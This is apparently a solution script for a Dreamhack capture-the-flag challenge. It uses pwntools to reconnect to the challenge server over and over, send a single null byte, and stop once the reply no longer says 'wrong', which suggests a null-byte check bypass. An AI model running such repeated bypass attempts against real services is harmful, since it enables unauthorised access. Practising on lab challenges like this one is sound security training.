import pwn

HOST = "host1.dreamhack.games"
PORT = 11667

while True:
    p = pwn.remote(HOST, PORT)
    p.recvline()
    p.sendline(b"\x00")
    res = p.recvline().decode()
    if not "wrong" in res:
        print(res)
        p.close()
        break
    p.close()
